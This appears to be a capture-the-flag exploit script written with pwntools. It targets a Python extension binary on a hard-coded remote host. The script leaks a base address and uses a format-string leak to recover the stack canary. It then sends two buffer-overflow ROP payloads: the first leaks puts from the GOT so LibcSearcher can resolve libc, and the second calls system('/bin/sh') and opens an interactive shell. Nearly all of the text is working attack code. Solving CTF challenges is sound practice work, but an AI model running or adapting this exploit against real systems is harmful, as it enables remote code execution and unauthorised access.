from pwn import * 
from pwn import p64,u64
import re
from LibcSearcher import *

debug = 0
gdb_is = 0
# context(arch='i386',os = 'linux')
context(arch='amd64',os = 'linux')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    if not gdb_is:
        r = process("./pwn")
    
else:
    host = "59.110.231.185:18605"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0


# if gdb_is:
#     r = gdb.debug("./pwn",f'b *{ret}')
#     # pause()
#     pass

r.sendlineafter(b'>',b'0')
so = ELF('./app.cpython-37m-x86_64-linux-gnu.so')
gift_fuc_addr = 0x68B0
r.recvuntil(b'Give you a gift ')
gift_addr = int(r.recvuntil(b'\n')[2:-1],16)
so.address = gift_addr - gift_fuc_addr
info(f'gitf_addr = {hex(gift_addr)}')
info(f'address = {hex(so.address)}')


r.send(b'%p'*256)
memery = r.recv()
canary = 0
canary = re.findall(r'0x.{14}00',str(memery,encoding='utf-8'))[0]
canary = int(canary[2:],16)
pop_rdi = 0x000003f8f + so.address
vuln_addr =  0x99f0 + so.address
ret = 0x301a + so.address
info(f'canary = {hex(canary)}')
r.sendlineafter(b'>',b'0')
r.send(b'B'*256)
time.sleep(1)
payload = b'A' * 0x108 + p64(canary) + p64(0) + p64(pop_rdi) + p64(so.got['puts']) + p64(so.sym['puts']) + p64(vuln_addr)
r.send(payload)

addr = r.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')
addr = r.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')
puts_addr = u64(addr)
info(f'puts_addr -> {hex(puts_addr)}')
libc = LibcSearcher('puts',puts_addr)
offser = puts_addr - libc.dump('puts')
binsh = offser + libc.dump('str_bin_sh')
system = offser + libc.dump('system')

info(f'binsh = {hex(binsh)}')
info(f'system = {hex(system)}')
r.send(b'B'*255)
time.sleep(1)
payload = b'A' * 0x108 + p64(canary) + p64(0) + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)
r.sendafter(b'B'*255,payload)

r.interactive()